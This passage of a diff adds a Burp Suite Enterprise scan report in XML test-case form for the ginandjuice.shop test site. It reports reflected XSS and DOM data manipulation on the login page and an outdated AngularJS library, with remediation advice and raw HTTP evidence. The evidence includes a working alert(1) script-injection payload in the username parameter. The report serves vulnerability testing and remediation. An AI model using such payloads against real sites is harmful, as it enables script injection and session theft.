+The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. 
+
+
+Remediation Detail
+Echoing user-controllable data within a script context is inherently dangerous and can make XSS attacks difficult to prevent. If at all possible, the application should avoid echoing user data within this context.
+
+Remediation Background
+In most situations where user-controllable data is copied into application responses, cross-site scripting
+attacks can be prevented using two layers of defenses:
+
+
+
+- Input should be validated as strictly as possible on arrival, given the kind of content that
+it is expected to contain. For example, personal names should consist of alphabetical
+and a small range of typographical characters, and be relatively short; a year of birth
+should consist of exactly four numerals; email addresses should match a well-defined
+regular expression. Input which fails the validation should be rejected, not sanitized.
+
+- User input should be HTML-encoded at any point where it is copied into
+application responses. All HTML metacharacters, including < > " ' and =, should be
+replaced with the corresponding HTML entities (&lt; &gt; etc).
+
+In cases where the application's functionality allows users to author content using
+a restricted subset of HTML tags and attributes (for example, blog comments which
+allow limited formatting and linking), it is necessary to parse the supplied HTML to
+validate that it does not use any dangerous syntax; this is a non-trivial task.
+
+
+Evidence
+Request:
+POST /login HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Cookie: session=g6Gc59O9XG0QXDA2lpP9iQmXGUISAvuY; AWSALB=bc/xjHxSk9KetJA0ThNTTZ4EuljanSzc4dYH6s7ByzewrKXr3xdFdrvn1HZnyQyNd0aa0WIsND+GYw5REg8MqKPfIqU4wjGDNtl8VbZNUt5f5miJTl1/XmVUa4gm; AWSALBCORS=bc/xjHxSk9KetJA0ThNTTZ4EuljanSzc4dYH6s7ByzewrKXr3xdFdrvn1HZnyQyNd0aa0WIsND+GYw5REg8MqKPfIqU4wjGDNtl8VbZNUt5f5miJTl1/XmVUa4gm
+
+csrf=3MAA8E1xiojitDlQzeBzI4do2zHG48rF&username=87570347132'%3balert(1)%2f%2f649
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:04:00 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7821
+Set-Cookie: AWSALB=kI1bSNpIz3WyVc2fACYl9V841hkywk/EGgk57Vt5caVzwjLjinHpz7vS9wQXjq1qvFMfmojxHn8bvrIDxNiWuL6PN3YHXLnDMdNy2lL+yWSiG/QhMlsoNYFGgYFA; Expires=Thu, 14 Sep 2023 11:04:00 GMT; Path=/
+Set-Cookie: AWSALBCORS=kI1bSNpIz3WyVc2fACYl9V841hkywk/EGgk57Vt5caVzwjLjinHpz7vS9wQXjq1qvFMfmojxHn8bvrIDxNiWuL6PN3YHXLnDMdNy2lL+yWSiG/QhMlsoNYFGgYFA; Expires=Thu, 14 Sep 2023 11:04:00 GMT; Path=/; SameSite=None; Secure
+X-Backend: 77f6218a-0cf1-40a4-8590-b355c8c38596
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip<script>
+var username = '87570347132';alert(1)//649';
+document.getElementById('usernameInput').value = username;
+</script>Snip
+
+
+
+References
+	
+- Web Security Academy: Cross-site scripting (https://portswigger.net/web-security/cross-site-scripting)
+
+- Web Security Academy: Reflected cross-site scripting (https://portswigger.net/web-security/cross-site-scripting/reflected)
+
+- Using Burp to Find XSS issues (https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html)
+
+
+
+Vulnerability Classifications
+
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (https://cwe.mitre.org/data/definitions/79.html)
+
+- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) (https://cwe.mitre.org/data/definitions/80.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+- CWE-159: Failure to Sanitize Special Element (https://cwe.mitre.org/data/definitions/159.html)
+
+- CAPEC-591: Reflected XSS (https://capec.mitre.org/data/definitions/591.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="DOM data manipulation (reflected DOM-based)">
+            <failure message="DOM data manipulation (reflected DOM-based) found at https://ginandjuice.shop/login" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /login
+
+
+Issue Detail
+The application may be vulnerable to reflected DOM-based DOM data manipulation.
+
+The value of the username request parameter is copied into a JavaScript string literal. The payload bg8g73jt46 was submitted in the username parameter.
+
+The string containing the payload is then passed to the 'value' property of a DOM element.
+
+Issue Background
+Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.
+
+DOM data manipulation arises when a script writes controllable data to a field within the DOM that is used within the visible UI or client-side application logic. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will modify the appearance or behavior of the client-side UI. An attacker may be able to leverage this to perform virtual defacement of the application, or possibly to induce the user to perform unintended actions. 
+
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based DOM data manipulation vulnerabilities is not to dynamically write to DOM data fields any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored. In general, this is best achieved by using a whitelist of permitted values.
+
+
+Evidence
+Request 1:
+POST /login HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Cookie: session=wALi1qTavT44ehunjTE2gA7WB7ChkuXI; AWSALB=aINY5TiAqWiBezEkUBk6ScV0XgDaj70L0B6OsISZ5TaeSPR2c7egN9999tCXLIr+4xZcFaaB57Q2C5kZVARG/Eno7MprO6Uw0jChVuZwGVPLG6Zu5jPLvc8lyK4p; AWSALBCORS=aINY5TiAqWiBezEkUBk6ScV0XgDaj70L0B6OsISZ5TaeSPR2c7egN9999tCXLIr+4xZcFaaB57Q2C5kZVARG/Eno7MprO6Uw0jChVuZwGVPLG6Zu5jPLvc8lyK4p
+
+csrf=p4s31RskFq0fwvcrhUkAghuD388y2Lj4&username=875703bg8g73jt46
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:06:34 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7811
+Set-Cookie: AWSALB=1zfLPaX7ExFIKnA83eTDDdTfD7a9QF1mfhhe+Sh1mQ1DkmyMkc9QCXvnAPonOkmZnAxJuvsscaQLiXpN/2zRaaMubi+LIQd+KUkK/uxEg9gCG0C9/ToI7JL6WCZN; Expires=Thu, 14 Sep 2023 11:06:34 GMT; Path=/
+Set-Cookie: AWSALBCORS=1zfLPaX7ExFIKnA83eTDDdTfD7a9QF1mfhhe+Sh1mQ1DkmyMkc9QCXvnAPonOkmZnAxJuvsscaQLiXpN/2zRaaMubi+LIQd+KUkK/uxEg9gCG0C9/ToI7JL6WCZN; Expires=Thu, 14 Sep 2023 11:06:34 GMT; Path=/; SameSite=None; Secure
+X-Backend: 6ee1d000-9aff-4799-bfe5-704c0280a506
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip<script>
+var username = '875703bg8g73jt46';
+document.getElementById('usernameInput').value = username;
+</script>Snip
+
+Static analysis:
+
+
+Data is read from 875703bg8g73jt46 and passed to the 'value' property of a DOM element
+via the following statements:
+
+
+
+
+- var username = '875703bg8g73jt46';
+- document.getElementById('usernameInput').value = username;
+
+
+
+
+Dynamic analysis:
+
+
+Data is read from bg8g73jt46 and passed to input.value.
+
+
+
+
+- 
+The previous value reached the sink:
+
+875703fmunuf5yf1
+
+
+
+- 
+The stack trace at source was:
+
+at _0x217cd0 (<anonymous>:1:255280)
+at HTMLInputElement.set [as value] (<anonymous>:1:493424)
+at https://ginandjuice.shop/login:72:80
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.aoIqt (<anonymous>:1:106209)
+at Object.wHPpa (<anonymous>:1:479984)
+at HTMLInputElement.set [as value] (<anonymous>:1:493468)
+at https://ginandjuice.shop/login:72:80
+
+
+
+
+
+
+
+
+References
+    
+- Web Security Academy: DOM data manipulation (https://portswigger.net/web-security/dom-based/dom-data-manipulation)
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CAPEC-153: Input Data Manipulation (https://capec.mitre.org/data/definitions/153.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/login" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/my-account" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/css/labsBlog.css" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/css/labsEcommerce.css" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/css/labsScanme.css" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/footer/js/scanme.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="1" name="https://ginandjuice.shop:443/resources/js/angular_1-7-7.js" tests="1">
+        <testcase name="Vulnerable JavaScript dependency">
+            <failure message="Vulnerable JavaScript dependency found at https://ginandjuice.shop/resources/js/angular_1-7-7.js" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Tentative
+
+Host: https://ginandjuice.shop
+
+Path: /resources/js/angular_1-7-7.js
+
+
+Issue Detail
+We observed a vulnerable JavaScript library.
+
+We detected angularjs version 1.7.7, which has the following vulnerabilities:
+
+
+
+- 
+CVE-2020-7676 (https://nvd.nist.gov/vuln/detail/CVE-2020-7676): XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to JQLite methods like JQLite.prepend, JQLite.after, JQLite.append, JQLite.replaceWith, JQLite.append, new JQLite and angular.element.
+
+
+
+- 
+CVE-2020-7676 (https://nvd.nist.gov/vuln/detail/CVE-2020-7676): angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one.
+
+
+
+- 
+Prototype pollution
+
+https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a (https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a)
+
+https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19 (https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19)
+
+
+
+- 
+End-of-Life: Long term support for AngularJS has been discontinued
+
+https://blog.angular.io/discontinued-long-term-support-for-angularjs-cc066b82e65a?gi=9d3103b5445c (https://blog.angular.io/discontinued-long-term-support-for-angularjs-cc066b82e65a?gi=9d3103b5445c)
+
+
+
+
+
+
+
+Issue Background
+
+The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS.
+
+
+
+
+Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly.
+
+
+
+Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
+
+
+
+Issue Remediation
+Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.
+
+
+Evidence
+Request:
+GET /resources/js/angular_1-7-7.js HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=rWbNrl8HkFPpemLS2TItbN/G+ZUJJerNZUUYqSGyh/qnGpFnnFPnicDi6e57o71nGOtFMwgak36oM8wGjmyNcF/ChDCNHXa5XGjQAzDhqFbGT8zqPJxM01tGNiek; AWSALBCORS=rWbNrl8HkFPpemLS2TItbN/G+ZUJJerNZUUYqSGyh/qnGpFnnFPnicDi6e57o71nGOtFMwgak36oM8wGjmyNcF/ChDCNHXa5XGjQAzDhqFbGT8zqPJxM01tGNiek; session=TGr9vsvUtThcBAf7KxrPuy4frXmdLnkU
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:54 GMT
+Content-Type: application/javascript; charset=utf-8
+Content-Length: 195161
+Set-Cookie: AWSALB=m8Uv2FVWzJJ8VWsCcYDq6Q9WXawk3ZMVrZ6803QAe1G+LfMZ/NTNVe5UUq/7AQazf6dDwVIvfVBnfiLM8NK4SK5rHjvk/HNsHY//FbkTkn2appxQKp8R7sUmJd4u; Expires=Thu, 14 Sep 2023 10:58:54 GMT; Path=/
+Set-Cookie: AWSALBCORS=m8Uv2FVWzJJ8VWsCcYDq6Q9WXawk3ZMVrZ6803QAe1G+LfMZ/NTNVe5UUq/7AQazf6dDwVIvfVBnfiLM8NK4SK5rHjvk/HNsHY//FbkTkn2appxQKp8R7sUmJd4u; Expires=Thu, 14 Sep 2023 10:58:54 GMT; Path=/; SameSite=None; Secure
+Cache-Control: public, max-age=3600
+X-Backend: 6ee1d000-9aff-4799-bfe5-704c0280a506
+X-Frame-Options: SAMEORIGIN
+
+/*
+AngularJS v1.7.7
+(c) 2010-2018 Google, Inc. http://angularjs.org
+License: MIT
+*/
+(function(C){'use strict';function re(a){if(D(a))w(a.objectMaxDepth)&&(Wb.objectMaxDepth=Xb(a.objectMaxDepth)?a.objectMaxDepth:NaN),w(Snip
+
+
+
+Vulnerability Classifications
+
+- CWE-1104: Use of Unmaintained Third Party Components (https://cwe.mitre.org/data/definitions/1104.html)
+
+- A9: Using Components with Known Vulnerabilities (https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/deparam.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/react-dom.development.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/react.development.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/searchLogger.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/stockCheck.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/subscribeNow.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/js/xmlStockCheckPayload.js" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/resources/labheader/css/scanMeHeader.css" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/robots.txt" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="http://ginandjuice.shop:80/robots.txt" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://auth.management-prod.cloud.portswigger.com:443/robots.txt" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://auth.management-prod.cloud.portswigger.com:443/web" tests="1">
+        <testcase name="No issues were identified"/>
     </testsuite>
     <testsuite failures="0" name="https://auth.management-prod.cloud.portswigger.com:443/web/app/index-0da50db0.css" tests="1">
         <testcase name="No issues were identified"/>
